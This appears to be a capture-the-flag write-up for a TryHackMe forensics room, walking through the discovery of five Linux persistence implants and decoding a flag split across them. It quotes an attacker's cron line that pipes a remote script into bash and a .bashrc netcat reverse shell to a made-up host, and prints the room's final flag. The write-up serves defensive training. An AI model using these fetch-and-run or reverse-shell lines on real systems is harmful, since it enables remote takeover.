# Hide and Seek

### Challenge Link: https://tryhackme.com/room/hfb1hideandseek

## Objective

Conduct a live system analysis to identify and investigate multiple persistence mechanisms planted by the attacker, **Cipher**.

The challenge contains five clues, each pointing toward a different persistence mechanism. Each discovered implant contains a fragment of the final TryHackMe flag.

---

## Investigation Plan

### 1. Analyze Scheduled Tasks / Cron Persistence

**Clue:**

> “Time is on my side, always running like clockwork.”

**Expected persistence mechanism:** Cron job

**Investigation:**

* Enumerate root's crontab.
* Review system-wide cron configuration.
* Identify suspicious commands or encoded data.
* Decode any embedded Base64 or hexadecimal strings.
* Record the first flag fragment.

**Commands:**

```bash
sudo crontab -l -u root
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
```

**Finding:**

A root cron job executed every minute and contained a Base64-encoded command.

Decoded command:

```text
curl -s 54484d7b7930.storag3_c1ph3rsqu4d.net/a.sh | bash
```

The hexadecimal portion:

```text
54484d7b7930
```

decoded to:

```text
THM{y0
```

**Flag fragment #1:**

```text
THM{y0
```

---

### 2. Investigate SSH Persistence

**Clue:**

> “A secret handshake gets me in every time.”

**Expected persistence mechanism:** SSH authorized key

**Investigation:**

* Search user and root SSH directories.
* Inspect `authorized_keys`.
* Look for unusual keys or comments.
* Decode suspicious encoded data attached to the key.
* Record the second flag fragment.

**Commands:**

```bash
find /home /root -type f -name authorized_keys -print 2>/dev/null
```

Inspect the suspicious file:

```bash
sudo cat /home/zeroday/.ssh/.authorized_keys
```

The SSH key contained an encoded comment:

```text
326e6420706172743a20755f6730745f.local
```

Hex-decoding:

```bash
echo "326e6420706172743a20755f6730745f" | xxd -r -p
```

Result:

```text
2nd part: u_g0t_
```

**Flag fragment #2:**

```text
u_g0t_
```

---

### 3. Investigate Shell Startup Persistence

**Clue:**

> “Whenever you set the stage, I make my entrance.”

**Expected persistence mechanism:** Shell startup configuration

**Investigation:**

* Inspect user shell initialization files.
* Check `.bashrc`, `.profile`, and `.bash_profile`.
* Look for suspicious commands, reverse shells, or encoded data.
* Decode the embedded data.
* Record the third flag fragment.

**Command:**

```bash
sudo cat /home/specter/.bashrc
```

Suspicious command:

```text
nc -e /bin/bash 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io 443
```

Hex-decoding:

```bash
echo "4d334a6b58334130636e513649444e324d334a3564416f3d" | xxd -r -p
```

Result:

```text
M3JkX3A0cnQ6IDN2M3J5dAo=
```

Base64-decoding:

```bash
echo "M3JkX3A0cnQ6IDN2M3J5dAo=" | base64 -d
```

Result:

```text
3rd_p4rt: 3v3ryt
```

**Flag fragment #3:**

```text
3v3ryt
```

---

### 4. Investigate System Boot Persistence

**Clue:**

> “I run with the big dogs, booting up alongside the system.”

**Expected persistence mechanism:** Systemd service

**Investigation:**

* Enumerate systemd services.
* Look for custom or suspicious service files.
* Inspect service definitions without starting them.
* Decode suspicious embedded data.
* Record the fourth flag fragment.

**Command:**

```bash
ls -la /lib/systemd/system/
```

Suspicious service:

```text
/lib/systemd/system/cipher.service
```

Inspect it:

```bash
sudo cat /lib/systemd/system/cipher.service
```

The service contained:

```text
NHRoIHBhcnQgLSBoMW5nXyAK
```

Base64-decoding:

```bash
echo "NHRoIHBhcnQgLSBoMW5nXyAK" | base64 -d
```

Result:

```text
4th part - h1ng_
```

**Flag fragment #4:**

```text
h1ng_
```

---

### 5. Investigate MOTD / Login Persistence

**Clue:**

> “I love welcome messages.”

**Expected persistence mechanism:** MOTD/login script

**Investigation:**

* Inspect `/etc/motd`.
* Examine `/etc/update-motd.d/`.
* Identify suspicious modifications to MOTD scripts.
* Decode any embedded data.
* Record the final flag fragment.

**Commands:**

```bash
ls -la /etc/update-motd.d/
```

Inspect the header script:

```bash
cat /etc/update-motd.d/00-header
```

A suspicious Python reverse-shell command was found containing:

```text
4c61737420706172743a206430776e7d0.h1dd3nd00r.n3t
```

Hex-decoding:

```bash
echo "4c61737420706172743a206430776e7d0" | xxd -r -p
```

Result:

```text
Last part: d0wn}
```

**Flag fragment #5:**

```text
d0wn}
```

---

## Flag Reconstruction

The five fragments must be concatenated in clue order:

```text
THM{y0
u_g0t_
3v3ryt
h1ng_
d0wn}
```

Final flag:

```text
THM{y0u_g0t_3v3ryth1ng_d0wn}
```

---

## Persistence Mechanisms Identified

| # | Clue                | Persistence Mechanism | Location                              | Flag Fragment |
| - | ------------------- | --------------------- | ------------------------------------- | ------------- |
| 1 | Time / clockwork    | Cron                  | Root crontab                          | `THM{y0`      |
| 2 | Secret handshake    | SSH authorized key    | `/home/zeroday/.ssh/.authorized_keys` | `u_g0t_`      |
| 3 | Set the stage       | Bash startup          | `/home/specter/.bashrc`               | `3v3ryt`      |
| 4 | Booting with system | Systemd service       | `/lib/systemd/system/cipher.service`  | `h1ng_`       |
| 5 | Welcome messages    | MOTD script           | `/etc/update-motd.d/00-header`        | `d0wn}`       |

## Final Flag

```text
THM{y0u_g0t_3v3ryth1ng_d0wn}
```

## Key Forensic Takeaways

* Persistence can be distributed across multiple Linux subsystems.
* Attacker-controlled commands may be hidden using Base64 or hexadecimal encoding.
* SSH keys can contain malicious or misleading comments.
* Shell initialization files can execute commands whenever a user starts a shell.
* Systemd services provide powerful boot-time persistence.
* MOTD scripts can be abused to execute commands during login.
* During live analysis, suspicious payloads should be **inspected and decoded rather than executed**.